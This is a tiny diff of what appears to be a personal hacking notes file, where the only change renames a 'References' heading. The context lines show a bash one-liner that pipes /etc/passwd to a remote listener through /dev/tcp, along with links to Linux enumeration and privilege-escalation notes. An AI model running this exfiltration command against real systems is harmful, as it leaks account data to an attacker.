@@ -4,7 +4,7 @@ cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
 bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
 ```
 
-# References
+# Related
 - [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
 - ~/kb/hacking/priv-esc/enumeration-quick-commands.md
 
